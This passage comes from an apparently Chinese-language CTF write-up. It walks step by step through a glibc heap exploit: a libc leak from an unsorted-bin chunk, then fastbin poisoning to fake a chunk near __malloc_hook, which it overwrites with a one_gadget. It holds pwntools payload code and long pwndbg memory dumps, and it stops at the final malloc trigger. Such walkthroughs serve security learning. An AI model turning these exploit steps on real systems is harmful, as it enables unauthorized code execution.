0x0000000000000000</span><br><span class="line">0x55cf4877d020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55cf4877d030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55cf4877d040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55cf4877d050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55cf4877d060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55cf4877d070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55cf4877d080:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x55cf4877d090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55cf4877d0a0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55cf4877d0b0:	0x0000000000000080	0x0000000000000000</span><br><span class="line">0x55cf4877d0c0:	0x0000000000000000	0x0000000000002100</span><br><span class="line">0x55cf4877d0d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55cf4877d0e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55cf4877d0f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55cf4877d100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55cf4877d110:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x55cf4877d120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55cf4877d130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55cf4877d140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55cf4877d150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55cf4877d160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55cf4877d170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55cf4877d180:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<h5 id="free-4"><a href="#free-4" class="headerlink" title="free(4)"></a>free(4)</h5><p>此时已经存在两个index指向一个chunk。一个是最开始申请的index&#x3D;4，一个是后边再重新申请的index&#x3D;2，这时free(4),4号chunk的fd和bk变成了main+arena+88地址，_malloc_hook&#x3D;main_arena-0x10</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">4</span>)    <span class="comment"># 释放4号块 </span></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">__malloc_hook = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>)) - <span class="number">88</span> - <span class="number">0x10</span> </span><br><span class="line">libc_base = __malloc_hook - libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>] <span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base)) </span><br></pre></td></tr></table></figure>

<p>打印idx2(即idx4内容)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55a48aeca000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55a48aeca020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55a48aeca040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55a48aeca060</span><br><span class="line">Size: 0x21</span><br><span class="line"><span class="comment">#free(4)</span></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x55a48aeca080</span><br><span class="line">Size: 0x91</span><br><span class="line">fd: 0x7f46cb771b78</span><br><span class="line">bk: 0x7f46cb771b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x55a48aeca110</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55a48aeca1a0</span><br><span class="line">Size: 0x20e61</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x55a48aeca080 —▸ 0x7f46cb771b78 (main_arena+88) ◂— 0x55a48aeca080</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/50gx 0x55a48aeca000</span><br><span class="line">0x55a48aeca000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55a48aeca010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a48aeca020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55a48aeca030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a48aeca040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55a48aeca050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a48aeca060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55a48aeca070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a48aeca080:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x55a48aeca090:	0x00007f46cb771b78	0x00007f46cb771b78</span><br><span class="line">0x55a48aeca0a0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55a48aeca0b0:	0x0000000000000080	0x0000000000000000</span><br><span class="line">0x55a48aeca0c0:	0x0000000000000000	0x0000000000002100</span><br><span class="line">0x55a48aeca0d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a48aeca0e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a48aeca0f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a48aeca100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a48aeca110:	0x0000000000000090	0x0000000000000090</span><br><span class="line">0x55a48aeca120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a48aeca130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a48aeca140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a48aeca150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a48aeca160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a48aeca170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a48aeca180:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*] __malloc_hook: 0x7f46cb771b10 </span><br><span class="line">[*] libc_base: 0x7f46cb3ad000 </span><br></pre></td></tr></table></figure>

<h5 id="切割4号块"><a href="#切割4号块" class="headerlink" title="切割4号块"></a>切割4号块</h5><p>将四号块切割，使得一部分块放入fastbin中，这样才便于利用</p>
<p><strong>申请0x60空间</strong></p>
<p> 新块的idx为4（把idx4给了分配的块，因为分配的0x21没有idx）      </p>
<p> 切割0x91的块，剩下0x21放入了unsortedbin中 </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">allo(<span class="number">0x60</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55f4d9dc8000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55f4d9dc8020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55f4d9dc8040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55f4d9dc8060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55f4d9dc8080</span><br><span class="line">Size: 0x71</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x55f4d9dc80f0</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x7f3275391b78</span><br><span class="line">bk: 0x7f3275391b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x55f4d9dc8110</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55f4d9dc81a0</span><br><span class="line">Size: 0x20e61</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x55f4d9dc80f0 —▸ 0x7f3275391b78 (main_arena+88) ◂— 0x55f4d9dc80f0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/50gx 0x55f4d9dc8000</span><br><span class="line">0x55f4d9dc8000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55f4d9dc8010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f4d9dc8020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55f4d9dc8030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f4d9dc8040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55f4d9dc8050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f4d9dc8060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55f4d9dc8070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f4d9dc8080:	0x0000000000000000	0x0000000000000071</span><br><span class="line">0x55f4d9dc8090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f4d9dc80a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f4d9dc80b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f4d9dc80c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f4d9dc80d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f4d9dc80e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f4d9dc80f0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55f4d9dc8100:	0x00007f3275391b78	0x00007f3275391b78</span><br><span class="line">0x55f4d9dc8110:	0x0000000000000020	0x0000000000000090</span><br><span class="line">0x55f4d9dc8120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f4d9dc8130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f4d9dc8140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f4d9dc8150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f4d9dc8160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f4d9dc8170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f4d9dc8180:	0x0000000000000000	0x0000000000000000</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>释放0x60的块</strong></p>
<p>再次释放0x60的块，放入了fastbin中，为fastbin后面继续申请0x60的堆地址提供了帮助</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5563feb05000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5563feb05020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5563feb05040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5563feb05060</span><br><span class="line">Size: 0x21</span><br><span class="line"><span class="comment">#4</span></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x5563feb05080</span><br><span class="line">Size: 0x71</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x5563feb050f0</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x7f66aa6bfb78</span><br><span class="line">bk: 0x7f66aa6bfb78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5563feb05110</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5563feb051a0</span><br><span class="line">Size: 0x20e61</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x5563feb05080 ◂— 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5563feb050f0 —▸ 0x7f66aa6bfb78 (main_arena+88) ◂— 0x5563feb050f0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/50gx 0x5563feb05000</span><br><span class="line">0x5563feb05000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5563feb05010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5563feb05020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5563feb05030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5563feb05040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5563feb05050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5563feb05060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5563feb05070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5563feb05080:	0x0000000000000000	0x0000000000000071</span><br><span class="line">0x5563feb05090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5563feb050a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5563feb050b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5563feb050c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5563feb050d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5563feb050e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5563feb050f0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5563feb05100:	0x00007f66aa6bfb78	0x00007f66aa6bfb78</span><br><span class="line">0x5563feb05110:	0x0000000000000020	0x0000000000000090</span><br><span class="line">0x5563feb05120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5563feb05130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5563feb05140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5563feb05150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5563feb05160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5563feb05170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5563feb05180:	0x0000000000000000	0x0000000000000000</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="修改idx2内容，使其为malloc-hook附近构造chunk的地址"><a href="#修改idx2内容，使其为malloc-hook附近构造chunk的地址" class="headerlink" title="修改idx2内容，使其为malloc_hook附近构造chunk的地址"></a>修改idx2内容，使其为malloc_hook附近构造chunk的地址</h5><p>修改idx2内容，使其为malloc_hook附近构造chunk的地址，这块地址将来要创建一个虚假的chunk，要求是大小不能超过fastbin，并且包含malloc_hook，因为后面要将malloc_hook修改，使其指向其他函数，执行攻击。一般会将伪造的chunk的size为0x7f，正好在fastbin要求之内，也足够大，计算该地址为malloc_hook</p>
<p>查看malloc_hook的位置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt;  x/32gx (long long)(&amp;main_arena)-0x40</span><br><span class="line">0x7f66aa6bfae0 &lt;_IO_wide_data_0+288&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f66aa6bfaf0 &lt;_IO_wide_data_0+304&gt;:	0x00007f66aa6be260	0x0000000000000000<span class="comment">#计算可知要构造size位为:0x000000000000007f，其地址为malloc_hook-35</span></span><br><span class="line">0x7f66aa6bfb00 &lt;__memalign_hook&gt;:	0x00007f66aa380ea0	0x00007f66aa380a70</span><br><span class="line">0x7f66aa6bfb10 &lt;__malloc_hook&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f66aa6bfb20 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f66aa6bfb30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f66aa6bfb40 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f66aa6bfb50 &lt;main_arena+48&gt;:	0x00005563feb05080	0x0000000000000000</span><br><span class="line">0x7f66aa6bfb60 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f66aa6bfb70 &lt;main_arena+80&gt;:	0x0000000000000000	0x00005563feb051a0</span><br><span class="line">0x7f66aa6bfb80 &lt;main_arena+96&gt;:	0x00005563feb050f0	0x00005563feb050f0</span><br><span class="line">0x7f66aa6bfb90 &lt;main_arena+112&gt;:	0x00005563feb050f0	0x00007f66aa6bfb88</span><br><span class="line">0x7f66aa6bfba0 &lt;main_arena+128&gt;:	0x00007f66aa6bfb88	0x00007f66aa6bfb98</span><br><span class="line">0x7f66aa6bfbb0 &lt;main_arena+144&gt;:	0x00007f66aa6bfb98	0x00007f66aa6bfba8</span><br><span class="line">0x7f66aa6bfbc0 &lt;main_arena+160&gt;:	0x00007f66aa6bfba8	0x00007f66aa6bfbb8</span><br><span class="line">0x7f66aa6bfbd0 &lt;main_arena+176&gt;:	0x00007f66aa6bfbb8	0x00007f66aa6bfbc8</span><br><span class="line">pwndbg&gt; x/2gx 0x7f66aa6bfb10-35 </span><br><span class="line">0x7f66aa6bfaed &lt;_IO_wide_data_0+301&gt;:	0x66aa6be260000000	0x000000000000007f </span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(__malloc_hook - <span class="number">35</span>) </span><br><span class="line">fill(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5582aad11000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5582aad11020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5582aad11040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5582aad11060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x5582aad11080</span><br><span class="line">Size: 0x71</span><br><span class="line">fd: 0x7f5647966aed<span class="comment">#指向(_IO_wide_data_0+301)</span></span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x5582aad110f0</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x7f5647966b78</span><br><span class="line">bk: 0x7f5647966b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5582aad11110</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5582aad111a0</span><br><span class="line">Size: 0x20e61</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x5582aad11080 —▸ 0x7f5647966aed (_IO_wide_data_0+301) ◂— 0x5647627ea0000000</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5582aad110f0 —▸ 0x7f5647966b78 (main_arena+88) ◂— 0x5582aad110f0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/50gx 0x5582aad11000</span><br><span class="line">0x5582aad11000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5582aad11010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5582aad11020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5582aad11030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5582aad11040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5582aad11050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5582aad11060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5582aad11070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5582aad11080:	0x0000000000000000	0x0000000000000071</span><br><span class="line">0x5582aad11090:	0x00007f5647966aed	0x0000000000000000</span><br><span class="line">0x5582aad110a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5582aad110b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5582aad110c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5582aad110d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5582aad110e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5582aad110f0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5582aad11100:	0x00007f5647966b78	0x00007f5647966b78</span><br><span class="line">0x5582aad11110:	0x0000000000000020	0x0000000000000090</span><br><span class="line">0x5582aad11120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5582aad11130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5582aad11140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5582aad11150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5582aad11160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5582aad11170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5582aad11180:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; x/30gx 0x7f5647966aed</span><br><span class="line">0x7f5647966aed &lt;_IO_wide_data_0+301&gt;:	0x5647965260000000	0x000000000000007f</span><br><span class="line">0x7f5647966afd:	0x5647627ea0000000	0x5647627a7000007f</span><br><span class="line">0x7f5647966b0d &lt;__realloc_hook+5&gt;:	0x000000000000007f	0x0000000000000000</span><br><span class="line">0x7f5647966b1d:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f5647966b2d &lt;main_arena+13&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f5647966b3d &lt;main_arena+29&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f5647966b4d &lt;main_arena+45&gt;:	0x82aad11080000000	0x0000000000000055</span><br><span class="line">0x7f5647966b5d &lt;main_arena+61&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f5647966b6d &lt;main_arena+77&gt;:	0x0000000000000000	0x82aad111a0000000</span><br><span class="line">0x7f5647966b7d &lt;main_arena+93&gt;:	0x82aad110f0000055	0x82aad110f0000055</span><br><span class="line">0x7f5647966b8d &lt;main_arena+109&gt;:	0x82aad110f0000055	0x5647966b88000055</span><br><span class="line">0x7f5647966b9d &lt;main_arena+125&gt;:	0x5647966b8800007f	0x5647966b9800007f</span><br><span class="line">0x7f5647966bad &lt;main_arena+141&gt;:	0x5647966b9800007f	0x5647966ba800007f</span><br><span class="line">0x7f5647966bbd &lt;main_arena+157&gt;:	0x5647966ba800007f	0x5647966bb800007f</span><br><span class="line">0x7f5647966bcd &lt;main_arena+173&gt;:	0x5647966bb800007f	0x5647966bc800007f</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="申请假chunk，并将malloc-hook修改-malloc-gt-gadget"><a href="#申请假chunk，并将malloc-hook修改-malloc-gt-gadget" class="headerlink" title="申请假chunk，并将malloc_hook修改 malloc-&gt;gadget"></a>申请假chunk，并将malloc_hook修改 malloc-&gt;gadget</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line">allo(<span class="number">0x60</span>)<span class="comment">#申请假chunk</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x8</span>+<span class="number">0x2</span>+<span class="number">0x8</span>+<span class="number">1</span>) </span><br><span class="line">payload += p64(libc_base+<span class="number">0x4526a</span>) </span><br><span class="line">fill(<span class="number">6</span>,<span class="built_in">len</span>(payload),payload)  </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x562f5ab09000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x562f5ab09020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x562f5ab09040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x562f5ab09060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x562f5ab09080</span><br><span class="line">Size: 0x71</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x562f5ab090f0</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x7f99e2ffeb78</span><br><span class="line">bk: 0x7f99e2ffeb78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x562f5ab09110</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x562f5ab091a0</span><br><span class="line">Size: 0x20e61</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x99e2cbfea0000000</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x562f5ab090f0 —▸ 0x7f99e2ffeb78 (main_arena+88) ◂— 0x562f5ab090f0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/30gx 0x562f5ab09000</span><br><span class="line">0x562f5ab09000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x562f5ab09010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x562f5ab09020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x562f5ab09030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x562f5ab09040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x562f5ab09050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x562f5ab09060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x562f5ab09070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x562f5ab09080:	0x0000000000000000	0x0000000000000071</span><br><span class="line">0x562f5ab09090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x562f5ab090a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x562f5ab090b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x562f5ab090c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x562f5ab090d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x562f5ab090e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="再次执行malloc"><a href="#再次执行malloc" class="headerlink" title="再次执行malloc"></a>再次执行malloc</h5><p>因为malloc_hook已经被修改到其他地址，我们再次执行malloc，则会执行我们的目标函数，用one_gadget找到目标函数</p>
